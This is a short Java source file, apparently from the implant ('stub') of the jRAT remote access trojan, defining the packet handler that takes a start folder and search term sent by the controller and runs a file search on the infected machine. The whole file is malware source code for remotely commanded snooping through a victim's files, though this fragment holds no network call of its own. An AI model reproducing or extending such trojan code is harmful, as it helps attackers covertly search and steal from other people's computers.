package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.stub.Connection;
import se.jrat.stub.FileSearch;


public class Packet53StartSearch extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String start = con.readLine();
		if (!start.endsWith(File.separator)) {
			start = start + File.separator;
		}
		String what = con.readLine();
		boolean dir = con.readBoolean();
		new FileSearch(con, start, what, dir).start();
	}

}
